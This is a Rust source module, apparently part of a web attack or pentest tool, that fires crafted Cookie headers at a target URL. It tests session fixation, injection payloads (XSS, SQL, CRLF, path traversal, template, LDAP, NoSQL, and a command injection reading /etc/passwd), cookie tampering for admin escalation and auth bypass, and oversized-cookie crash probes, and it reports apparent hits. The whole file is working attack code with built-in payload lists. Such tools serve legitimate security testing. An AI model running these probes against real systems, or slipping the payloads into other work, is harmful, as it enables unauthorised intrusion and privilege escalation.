use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn fixation(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Session Fixation via Cookie", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let session_ids = [
        "FIXATED_SESSION_123",
        "attacker_session_id",
        "1234567890",
        "admin_session",
    ];

    for sid in &session_ids {
        let cookie = format!("session={}; PHPSESSID={}", sid, sid);
        match client.get(url).header("Cookie", &cookie).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let set_cookie = r
                    .headers()
                    .get("set-cookie")
                    .map(|v| v.to_str().unwrap_or(""))
                    .unwrap_or("");
                if status == 200 && !set_cookie.is_empty() {
                    if set_cookie.contains(sid) {
                        println!(
                            "  {} Session {:25} — FIXATED (server accepted)",
                            "[!]".red().bold(),
                            sid
                        );
                    } else {
                        println!(
                            "  {} Session {:25} — new session issued",
                            "[+]".green().bold(),
                            sid
                        );
                    }
                } else {
                    println!(
                        "  {} Session {:25} — status={}",
                        "[-]".dimmed(),
                        sid,
                        status
                    );
                }
            }
            Err(_) => println!("  {} Session {:25} — error", "[-]".dimmed(), sid),
        }
    }

    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Cookie Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let inject_payloads = [
        ("XSS via cookie", "session=<script>alert(1)</script>"),
        ("SQLi via cookie", "session=' OR '1'='1"),
        ("CRLF inject", "session=test\r\nSet-Cookie: admin=true"),
        ("Path traversal", "session=../../../etc/passwd"),
        ("Template inject", "session={{7*7}}"),
        ("Command inject", "session=; cat /etc/passwd"),
        ("LDAP inject", "session=*)(uid=*))(|(uid=*"),
        ("NoSQL inject", "session={$ne:null}"),
    ];

    for (name, payload) in &inject_payloads {
        match client.get(url).header("Cookie", *payload).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200
                    && (text.contains("49") || text.contains("root:") || text.contains("alert"))
                {
                    println!("  {} {:20} — INJECTED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn tamper(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Cookie Tampering", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let tamper_payloads = [
        ("Role escalate", "session=test; role=admin"),
        ("Admin flag", "session=test; isAdmin=true"),
        ("User override", "session=test; user=admin"),
        ("Auth bypass", "session=test; authenticated=true"),
        ("Debug mode", "session=test; debug=1"),
        ("Dev mode", "session=test; env=development"),
        ("Trust override", "session=test; trust=100"),
        ("CSRF bypass", "session=test; csrf_token=bypass"),
    ];

    for (name, payload) in &tamper_payloads {
        match client.get(url).header("Cookie", *payload).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200
                    && (text.contains("admin")
                        || text.contains("debug")
                        || text.contains("development"))
                {
                    println!("  {} {:20} — TAMPERED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn overflow(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Cookie Buffer Overflow", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let sizes = [100, 500, 1000, 5000, 10000, 50000];

    for size in &sizes {
        let payload = "A".repeat(*size);
        let cookie = format!("session={}", payload);
        match client.get(url).header("Cookie", &cookie).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 500 {
                    println!(
                        "  {} Size {:6} — SERVER ERROR (crash?)",
                        "[!]".red().bold(),
                        size
                    );
                } else if status == 413 {
                    println!("  {} Size {:6} — payload too large", "[-]".dimmed(), size);
                } else {
                    println!(
                        "  {} Size {:6} — status={}",
                        "[+]".green().bold(),
                        size,
                        status
                    );
                }
            }
            Err(_) => println!("  {} Size {:6} — connection error", "[-]".dimmed(), size),
        }
    }

    Ok(())
}
